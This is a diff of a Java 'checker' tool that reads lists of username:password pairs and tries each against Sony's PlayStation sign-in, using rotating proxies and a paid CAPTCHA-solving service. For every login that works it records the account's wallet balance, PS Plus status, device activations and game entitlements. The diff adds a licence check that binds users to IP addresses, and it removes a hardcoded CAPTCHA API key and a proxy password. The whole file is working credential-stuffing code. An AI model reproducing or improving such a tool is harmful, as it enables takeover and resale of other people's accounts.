@@ -1,29 +1,47 @@
 package com.checker;
 
+import java.io.*;
+import java.net.InetAddress;
 import java.net.MalformedURLException;
 import java.net.URISyntaxException;
 import java.net.URL;
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.Random;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.time.LocalDate;
+import java.time.LocalDateTime;
+import java.time.LocalTime;
+import java.time.chrono.Chronology;
+import java.time.format.DateTimeFormatter;
+import java.time.format.DateTimeFormatterBuilder;
+import java.util.*;
 import java.util.concurrent.Callable;
+import java.util.concurrent.ExecutionException;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.function.Predicate;
 import java.util.stream.Collectors;
 
+import com.google.api.client.util.DateTime;
+import com.google.api.core.ApiFuture;
+import com.google.auth.oauth2.GoogleCredentials;
+import com.google.auth.oauth2.ServiceAccountCredentials;
+import com.google.cloud.firestore.*;
+import com.google.firebase.FirebaseApp;
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.auth.FirebaseAuthException;
+import com.google.firebase.auth.UserRecord;
 import org.apache.http.auth.UsernamePasswordCredentials;
+import org.apache.log4j.Logger;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+import org.json.simple.parser.JSONParser;
+import org.json.simple.parser.ParseException;
 import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
 import org.jsoup.nodes.Element;
 
-import com.anti_captcha.Api.NoCaptcha;
 import com.anti_captcha.Api.NoCaptchaProxyless;
 import com.anti_captcha.Helper.DebugHelper;
 import com.anti_captcha.Helper.HttpHelper;
@@ -33,87 +51,200 @@ import com.anti_captcha.Http.HttpResponse;
 import com.twocaptcha.api.ProxyType;
 import com.twocaptcha.api.TwoCaptchaService;
 
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileNotFoundException;
-import java.io.FileReader;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.io.PrintWriter;
-
 public class Main {
 
-	static PrintWriter pw;
-	static ExecutorService executor;
-	static String proxyHost = "";
-	static int proxyPort = 80;
-	
-    public static void main(String[] args) throws InterruptedException, JSONException, IOException, URISyntaxException {
-        executor = Executors.newFixedThreadPool(2);
-        List<String> proxies = loadProxies();
-    	List<Account> accounts = readAccountsFromFile(false);
-    	executeWorker(accounts, proxies);
-    }
-    
-	static int i=0;
-    static List<Account> validAccounts = new ArrayList<Account>();
+	static ExecutorService executor = Executors.newFixedThreadPool(2);
+	static String proxyHost = null;
+	static String proxyPort = null;
+    static String proxyUsername = null;
+    static String proxyPassword = null;
 
-    private static void executeWorker(List<Account> accounts, List<String> proxies) throws IOException, URISyntaxException, InterruptedException {
-    	String currentLine;
-    	BufferedReader outBr;
-    	final List<Account> accountsProgress = new ArrayList<Account>();
-    	try {
-    		ClassLoader loader = Thread.currentThread().getContextClassLoader();
-			URL resource = loader.getResource("output.txt");
-			if(resource != null) {
-				outBr = new BufferedReader(new FileReader(new File(resource.toURI()).getAbsolutePath()));
-				while ((currentLine = outBr.readLine()) != null) {
-		    		if(currentLine.contains("<--------------")) {
-		    			currentLine = currentLine.replace("<-------------- ", "");
-		    			if(currentLine.indexOf("<<<<") > -1)
-		    				currentLine = currentLine.substring(0, currentLine.indexOf("<<<<") - 1).trim();
-		    			else if(currentLine.indexOf("(") > -1)
-		    				currentLine = currentLine.substring(0, currentLine.indexOf("(")).trim();
-		    			String[] credentialsStr = currentLine.split(":");
-		    			if(credentialsStr.length == 2) {
-			    			Account pAccount = new Account(credentialsStr[0], credentialsStr[1]);
-			    			accountsProgress.add(pAccount);
-		    			}
-		    		}
-		    	}
-			    outBr.close();
+    static String twoCaptchaToken = null;
+
+	static int i=0;
+
+	static BufferedReader br;
+	static BufferedReader proxyBr;
+
+	static Path outputFilePath;
+	static Path successFilePath;
+	static Path failFilePath;
+	static Path jarDirectoryPath;
+
+	static String token;
+	static String inputFilePath;
+	static String outputFileDirectory;
+	static String proxyFilePath;
+
+	static int accountNumberProgress = 1;
+
+	static boolean hasAccess = false;
+
+	public static void main(String[] args) throws RecaptchaSolvingError, Exception {
+		jarDirectoryPath = Paths.get(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getParent();
+		readArgs();
+		hasAccess = authenticateUser();
+		if(hasAccess) {
+			System.out.println("Logged in successfully");
+			readInputFiles(inputFilePath, proxyFilePath);
+			createOuputFile(outputFileDirectory);
+			List<String> proxies = loadProxies();
+			List<Account> accounts = readAccountsFromFile();
+			executeWorker(accounts, proxies);
+		}
+    }
+
+    private static boolean authenticateUser() throws Exception, URISyntaxException, IOException {
+		if(token.isEmpty())
+			throw new Exception("Invalid token");
+		System.out.println("Logging in with " + token);
+		System.out.println("Please wait... ");
+		ClassLoader loaderPw = Thread.currentThread().getContextClassLoader();
+		GoogleCredentials credentials;
+		try (InputStream serviceAccountStream = loaderPw.getResourceAsStream("psnch-51bab-firebase-adminsdk-zg2mv-34f2efe25d.json")) {
+			credentials = ServiceAccountCredentials.fromStream(serviceAccountStream);
+		}
+
+		com.google.firebase.FirebaseOptions options = new com.google.firebase.FirebaseOptions.Builder()
+				.setCredentials(credentials)
+				.setDatabaseUrl("https://psnch-51bab.firebaseio.com")
+				.build();
+
+		FirebaseApp defaultApp = FirebaseApp.initializeApp(options);
+		FirebaseAuth defaultAuth = FirebaseAuth.getInstance(defaultApp);
+
+		FirestoreOptions firestoreOptions =
+				FirestoreOptions.getDefaultInstance().toBuilder()
+						.setCredentials(credentials)
+						.setProjectId("psnch-51bab")
+						.build();
+
+		Firestore db = firestoreOptions.getService();
+
+		boolean hasAccess = false;
+
+		try {
+			UserRecord user = defaultAuth.getUser(token);
+
+			DocumentReference docRef = db.collection("users").document(token);
+			DocumentSnapshot document = docRef.get().get();
+
+			try {
+				URL url_name = new URL("http://bot.whatismyipaddress.com");
+				BufferedReader sc =
+						new BufferedReader(new InputStreamReader(url_name.openStream()));
+				String ipAddress = sc.readLine().trim();
+				if (document.exists()) {
+					String storedIpAddress = (String) document.getData().get("ip");
+
+					if (storedIpAddress != null && storedIpAddress.compareToIgnoreCase(ipAddress) == 0 && !user.isDisabled()) {
+						hasAccess = true;
+					} else if (storedIpAddress == null || storedIpAddress.compareToIgnoreCase(ipAddress) != 0) {
+						System.out.println("Your Ip address is not registred");
+					} else if (user.isDisabled()) {
+						System.out.println("Your account has been disabled");
+					}
+				} else {
+					Map<String, Object> data = new HashMap<>();
+					data.put("ip", ipAddress);
+					ApiFuture<WriteResult> result = docRef.set(data);
+					hasAccess = true;
+				}
+
+				return hasAccess;
 			}
-		} catch (URISyntaxException e) {
-			e.printStackTrace();
-		} catch (IOException e) {
+        	catch (Exception e){
+			}
+
+		}catch(FirebaseAuthException | InterruptedException | ExecutionException authException) {
+			System.out.println("Invalid token");
+		}
+		return false;
+	}
+
+    private static void readArgs() {
+		JSONParser jsonParser = new JSONParser();
+
+		Path configFilePath = Paths.get(jarDirectoryPath + "/" + "config.json");
+		try {
+            FileReader reader = new FileReader(configFilePath.toFile());
+            org.json.simple.JSONObject config = (org.json.simple.JSONObject) jsonParser.parse(reader);
+            token = (String)config.get("access_token");
+            inputFilePath = jarDirectoryPath + "/" + (String)config.get("input_file_path");
+            outputFileDirectory = jarDirectoryPath.toString();
+            proxyFilePath = jarDirectoryPath + "/" + (String)config.get("proxy_file_path");
+            org.json.simple.JSONObject proxyAuth = (org.json.simple.JSONObject) config.get("proxy_auth");
+            proxyUsername = (String)proxyAuth.get("username");
+            proxyPassword = (String)proxyAuth.get("password");
+            twoCaptchaToken = (String)config.get("2captcha_token");
+
+		} catch (IOException | ParseException e) {
 			e.printStackTrace();
 		}
 
+	}
 
-		validAccounts = accounts
+	private static void readInputFiles(String inputFilePath, String proxyFilePath) throws Exception {
+		try {
+			br = new BufferedReader(new FileReader(inputFilePath));
+		} catch (FileNotFoundException e) {
+			throw new Exception("Input file path invalid");
+		}
+		try {
+			proxyBr = new BufferedReader(new FileReader(proxyFilePath));
+		} catch (FileNotFoundException e) {
+			throw new Exception("Proxy file path invalid");
+		}
+	}
+
+	private static void createOuputFile(String outputFileDirectory) throws Exception {
+		try {
+			LocalDate currentDate = LocalDate.now();
+			LocalTime currentTime = LocalTime.now();
+			LocalDateTime now = LocalDateTime.of(currentDate, currentTime);
+			DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss");
+			String nowStr = formatter.format(now);
+			Path directory = Files.createDirectory(Paths.get(outputFileDirectory + "/output_" + nowStr));
+			outputFilePath = Files.createFile(Paths.get(directory.toAbsolutePath() + "/result.txt"));
+			successFilePath = Files.createFile(Paths.get(directory.toAbsolutePath() + "/success.txt"));
+			failFilePath = Files.createFile(Paths.get(directory.toAbsolutePath() + "/fail.txt"));
+		} catch (IOException e) {
+			throw new Exception("Unable to create output file");
+		}
+	}
+
+    private static void executeWorker(List<Account> accounts, List<String> proxies) throws RecaptchaSolvingError {
+		PrintWriter resultPw = null;
+		PrintWriter successPw = null;
+		PrintWriter failPw = null;
+
+		List<Account> validAccounts = accounts
 				.stream()
-				.filter(acc -> !IsDoublon(acc, accountsProgress))
+				.skip(accountNumberProgress - 1)
 				.collect(Collectors.<Account>toList());
-    	    	
-    	ClassLoader loaderPw = Thread.currentThread().getContextClassLoader();
-		URL resourcePw = loaderPw.getResource("output.txt");
-		
+
         for(Account acc : validAccounts) {
 //			executor.execute(new Runnable() {
 				String accountInfosDisplay = "";
 				
 //				@Override
 //				public void run() {
-					Random random = new Random();
-		        	int randomIndex = random.nextInt(proxies.size());
-		        	proxyHost = proxies.get(randomIndex);
-		        	
-		        	System.out.println("status (" + i + "," + validAccounts.size() + ") checked" );
+					if(proxies.size() > 0) {
+						Random random = new Random();
+						int randomIndex = random.nextInt(proxies.size());
+						proxyHost = proxies.get(randomIndex);
+					}
+
+		        	System.out.println("Progress: " + i + " of " + validAccounts.size() + " accounts has been checked" );
 		        	
 		        	try {
-						pw = new PrintWriter(
-						        new FileWriter(new File(resourcePw.toURI()), true));
-					} catch (IOException | URISyntaxException e) {
+						resultPw = new PrintWriter(
+						        new FileWriter(new File(outputFilePath.toUri()), true));
+						successPw = new PrintWriter(
+								new FileWriter(new File(successFilePath.toUri()), true));
+						failPw = new PrintWriter(
+								new FileWriter(new File(failFilePath.toUri()), true));
+					} catch (IOException e) {
 						// TODO Auto-generated catch block
 						e.printStackTrace();
 					}
@@ -122,11 +253,13 @@ public class Main {
 		            String password = acc.getPassword();
 		            
 		            boolean retry = true;
+		            int retryTimes = 0;
 		            while(retry) {
 		                String token = "";
-		            	// String recaptchaToken = resolveRecaptcha();
-		                System.out.println("Logging on " + proxyHost + ":" + proxyPort);
-		                String recaptchaToken = resolveWith2Captcha(proxyHost); 
+		                if(proxyHost != null)
+		                	System.out.println("Logging on " + proxyHost + ":" + proxyPort);
+		                String recaptchaToken = resolveWith2Captcha();
+						System.out.println("Checking account " + acc);
 			            Object[] result = authenticate(recaptchaToken, username);
 			            if (result != null) {
 				            token = (String) result[0];
@@ -150,26 +283,34 @@ public class Main {
 				            	boolean isNoDesactivateAvailable = isNoDesactivateAvailable(cookies);
 				            	String psPlusStr = isPsPlus ? "pssPlus" : "notPsPlus";
 				            	String ps4ActivatedStr = isPs4Activated ? "Ps4_activated" : "Ps4_not_activated";
-				            	String ps4DesactivateAll = isNoDesactivateAvailable ? "DESAC_ALL" : "NO_DESAC_ALL";
+				            	String ps4DesactivateAll = isNoDesactivateAvailable ? "DESACTIVATE_ALL" : "NO_DESACTIVATE_ALL";
 				            	String profileDisplay = "<-------------- " 
 				            			+ username + ":" + password + "(" + language + "-" + country + "," + balance + "," +
 		            					psPlusStr + "," + ps4DesactivateAll + "," + ps4ActivatedStr + ")" + "------------------>\n";
 				            	accountInfosDisplay += profileDisplay;
 				            	accountInfosDisplay += getEntitlements(cookies,language,country);
+				            	successPw.println(acc);
 			                }
 			                else {
 			                	String profileDisplay = "<-------------- " + username + ":" + password + " <<<< ERROR >>>>" + "------------------>\n";
 			                	accountInfosDisplay += profileDisplay;
+								failPw.println(acc);
 			                }
 			                retry = false;
 			            }
-			            else {
+			            else if(retryTimes < 2 ){
+							retryTimes ++;
 			            	retry = true;
 			            }
+			            else {
+			            	retry = false;
+						}
 		            }
 		            System.out.println(accountInfosDisplay);
-		            pw.println(accountInfosDisplay);
-		            pw.close();
+					resultPw.println(accountInfosDisplay);
+					resultPw.close();
+					successPw.close();
+					failPw.close();
 		            i++;
 //				}
 //			});
@@ -178,18 +319,13 @@ public class Main {
     
     private static List<String> loadProxies() {
     	List<String> proxies = new ArrayList<String>();
-	    
-		BufferedReader br = null;
-			ClassLoader loader = Thread.currentThread().getContextClassLoader();
-			URL resource = loader.getResource("proxies.txt");
 			try {
-				br = new BufferedReader(new FileReader(new File(resource.toURI()).getAbsolutePath()));
 				String currentLine;
-				while ((currentLine = br.readLine()) != null) {
+				while ((currentLine = proxyBr.readLine()) != null) {
 					proxies.add(currentLine);
 				}
 			}
-			catch (FileNotFoundException | URISyntaxException e) {
+			catch (FileNotFoundException  e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			} catch (IOException e) {
@@ -198,7 +334,7 @@ public class Main {
 			}
 			finally{
 				try {
-					br.close();
+					proxyBr.close();
 				} catch (IOException e) {
 					e.printStackTrace();
 				}
@@ -208,20 +344,14 @@ public class Main {
 			return proxies;
     }
     
-	private static List<Account> readAccountsFromFile(boolean fromInput) throws URISyntaxException {
+	private static List<Account> readAccountsFromFile() throws URISyntaxException {
 	    List<Account> accounts = new ArrayList<Account>();
-	    
-		BufferedReader br;
-		try {
-			ClassLoader loader = Thread.currentThread().getContextClassLoader();
-			URL resource = loader.getResource("input.txt");
-			br = new BufferedReader(new FileReader(new File(resource.toURI()).getAbsolutePath()));
-			
+	    try {
 			String currentLine;
 	        List<Account> checkedAccounts = new ArrayList<Account>();
 			Account account = null;
 			while ((currentLine = br.readLine()) != null) {
-				account = fromInput ? extractListFromInput(currentLine, account) : extractListFromOutput(currentLine, account);
+				account = extractListFromInput(currentLine, account);
 				if(account != null && account.getUsername().compareTo("") != 0 && account.getPassword().compareTo("") != 0) {
 					if(!IsDoublon(account, checkedAccounts)) {
 						accounts.add(new Account(account.getUsername(), account.getPassword()));
@@ -246,25 +376,8 @@ public class Main {
 	
 	@SuppressWarnings("unused")
 	private static Account extractListFromInput(String currentLine, Account account) {
-		if(currentLine.contains("j_username=")) {
+		if(currentLine.contains(":")) {
 		    account = new Account();
-			currentLine = currentLine.replaceFirst("j_username=", "");
-			account.setUsername(currentLine);
-		}
-		else if(currentLine.contains("j_password=")) {
-			if(account != null) {
-				currentLine = currentLine.replaceFirst("j_password=", "");
-				account.setPassword(currentLine);
-			}
-		}
-		return account;
-	}
-
-	private static Account extractListFromOutput(String currentLine, Account account) {
-		if(currentLine.contains("<------  ") && !currentLine.contains("Error")) {
-			account = new Account();
-			currentLine = currentLine.replaceFirst("<------  ", "");
-			currentLine = currentLine.substring(0, currentLine.indexOf(" ("));
 			account.setUsername(currentLine.split(":")[0]);
 			account.setPassword(currentLine.split(":")[1]);
 		}
@@ -285,7 +398,7 @@ public class Main {
 	private static boolean isPs4SystemActivated(String accountAuthorizationToken, Map<String, String> cookies) {
 		HttpRequest request = new HttpRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/gateway/store/v1/users/me/device/activation/count");
 		request.setCookies(cookies);
-		request.setProxy(proxyHost, proxyPort);
+		request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 		HttpResponse response;
 	      try {
 	          response = HttpHelper.download(request);
@@ -308,7 +421,7 @@ public class Main {
 	      try {
 	    	HttpRequest request = new HttpRequest("https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false");
 	  		request.setCookies(cookies);
-	  		request.setProxy(proxyHost, proxyPort);
+	  		request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 	  		response = HttpHelper.download(request);
 	  		String html = response.getBody();
 	  		Document doc = Jsoup.parse(html);
@@ -330,7 +443,7 @@ public class Main {
 	private static boolean isPsPlusMember(String accountAuthorizationToken, Map<String, String> cookies) {
 		HttpRequest request = new HttpRequest("https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/profile");
 		request.setCookies(cookies);
-		request.setProxy(proxyHost, proxyPort);
+		request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 		HttpResponse response;
 	      try {
 	          response = HttpHelper.download(request);
@@ -375,7 +488,7 @@ public class Main {
       
         request.addHeader("Authorization", "Bearer " + authorizationToken);
         request.setCookies(cookies); 
-        request.setProxy(proxyHost, proxyPort);
+        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
         
         HttpResponse response;
         try {
@@ -407,7 +520,7 @@ public class Main {
 
 	      request.addHeader("Authorization", "Bearer " + authorizationToken);
 	      request.setCookies(cookies); 
-	      request.setProxy(proxyHost, proxyPort);
+	      request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 	      
 	      HttpResponse response;
 	
@@ -456,7 +569,7 @@ public class Main {
     	
         request.addHeader("Authorization", "Bearer " + authorizationToken);
         request.setCookies(cookies);
-        request.setProxy(proxyHost, proxyPort);
+        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
         
         HttpResponse response;
         try {
@@ -477,7 +590,7 @@ public class Main {
     	
         request.addHeader("Authorization", "Bearer " + authorizationToken);
         request.setCookies(cookies);
-        request.setProxy(proxyHost, proxyPort);
+        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
         
         HttpResponse response;
         try {
@@ -495,7 +608,7 @@ public class Main {
         HttpRequest request = new HttpRequest(url);
         try {
             request.setCookies(cookies);
-            request.setProxy(proxyHost, proxyPort);
+            request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
             request.setFollowRedirects(false);
             HttpResponse response = HttpHelper.download(request);
             String locationRedirect = response.getHeaders().get("Location");
@@ -518,20 +631,20 @@ public class Main {
 			HttpRequest request = new HttpRequest(url);
 			try {
 				request.setCookies(cookies);
-				request.setProxy(proxyHost, proxyPort);
+				request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 				request.setFollowRedirects(false);
 				HttpResponse response = HttpHelper.download(request);
 				String locationRedirect = response.getHeaders().get("Location");
 
 				HttpRequest request2 = new HttpRequest(locationRedirect);
-				request2.setProxy(proxyHost, proxyPort);
+				request2.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 				request2.setFollowRedirects(false);
 				request2.setCookies(cookies);
 				HttpResponse response2 = HttpHelper.download(request2);
 				locationRedirect = response2.getHeaders().get("Location");
 
 				HttpRequest request3 = new HttpRequest(locationRedirect);
-				request3.setProxy(proxyHost, proxyPort);
+				request3.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
 				request3.setFollowRedirects(false);
 				request3.setCookies(cookies);
 				HttpResponse response3 = HttpHelper.download(request3);
@@ -548,7 +661,7 @@ public class Main {
         HttpRequest request = new HttpRequest(url);
         try {
             request.setCookies(cookies);
-            request.setProxy(proxyHost, proxyPort);
+            request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
             request.setFollowRedirects(false);
             HttpResponse response = HttpHelper.download(request);
             String locationRedirect = response.getHeaders().get("Location");
@@ -640,8 +753,6 @@ public class Main {
             	result[0] = JsonHelper.extractStr(postResult, "access_token");
             	result[1] = postResponse.getCookies();
                 return result;
-            } else {
-                //DebugHelper.out("Unknown error", //DebugHelper.Type.ERROR);
             }
 
         } catch (Exception e) {
@@ -653,20 +764,17 @@ public class Main {
 
     }
     
-    private static String resolveWith2Captcha(String proxyHost) {
-		String apiKey = "bfe812d7c799c3788b7441d818b17a63";
+    private static String resolveWith2Captcha() throws RecaptchaSolvingError {
+		String apiKey = twoCaptchaToken;
 		String googleKey = "6Le-UyUUAAAAAIqgW-LsIp5Rn95m_0V0kt_q0Dl5";
 		String pageUrl = "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-us%2Fhome%2Fgames&client_id=71a7beb8-f21a-47d9-a604-2e71bee24fe0&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_US&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated#/signin?entry=%2Fsignin";
-		String proxyIp = proxyHost;
-		String proxyPort = "80";
-		String proxyUser = "frausing85@hotmail.com";
-		String proxyPw = "hne85jkd";
+
 
 		/**
 		 * With proxy and user authentication
 		 */
-		TwoCaptchaService service = new TwoCaptchaService(apiKey, googleKey, pageUrl, proxyIp, proxyPort, proxyUser, proxyPw, ProxyType.HTTP);
-		
+		TwoCaptchaService service = new TwoCaptchaService(apiKey, googleKey, pageUrl, null, null, null, null, ProxyType.HTTP);
+
 		/**
 		 * Without proxy and user authentication
 		 * TwoCaptchaService service = new TwoCaptchaService(apiKey, googleKey, pageUrl);
@@ -674,16 +782,12 @@ public class Main {
 		
 		try {
 			String responseToken = service.solveCaptcha();
-			System.out.println("The response token is: " + responseToken);
+			System.out.println("Recaptcha solved successfully");
 			return responseToken;
-		} catch (InterruptedException e) {
-			System.out.println("ERROR case 1");
-			e.printStackTrace();
-		} catch (IOException e) {
-			System.out.println("ERROR case 2");
-			e.printStackTrace();
+		} catch (IOException | IllegalStateException | InterruptedException e) {
+			throw new RecaptchaSolvingError();
 		}
-		return null;
+
     }
 
     public static HttpResponse jsonPostRequest(String url, Map<String, String> cookies, List<Map<String, String>> headers, String jsonPostData) {
@@ -691,7 +795,7 @@ public class Main {
         HttpRequest request = new HttpRequest(url);
         if(cookies != null)
         	request.setCookies(cookies);
-        request.setProxy(proxyHost, proxyPort);
+        request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
         request.setRawPost(jsonPostData);
         for (Map<String, String> header : headers) {
             for (Map.Entry<String, String> entry : header.entrySet()) {
@@ -721,7 +825,7 @@ private static String getEntitlements(Map<String, String> cookies, String langua
 
       request.addHeader("Authorization", "Bearer " + authorizationToken);
       request.setCookies(cookies);
-      request.setProxy(proxyHost, proxyPort);
+      request.setProxy(proxyHost, proxyPort, proxyUsername, proxyPassword);
       
       HttpResponse response;
       try {
@@ -764,7 +868,7 @@ private static String getEntitlements(Map<String, String> cookies, String langua
 
   }
   
-  private static String resolveRecaptcha() throws MalformedURLException, InterruptedException {
+  private static String resolveWithAnticaptcha() throws MalformedURLException, InterruptedException {
       DebugHelper.setVerboseMode(true);
 
       NoCaptchaProxyless api = new NoCaptchaProxyless();
@@ -784,4 +888,10 @@ private static String getEntitlements(Map<String, String> cookies, String langua
       return null;
   }
     
+}
+
+class RecaptchaSolvingError extends Exception{
+	RecaptchaSolvingError() {
+		super("A problem occured during recaptcha solving");
+	}
 }
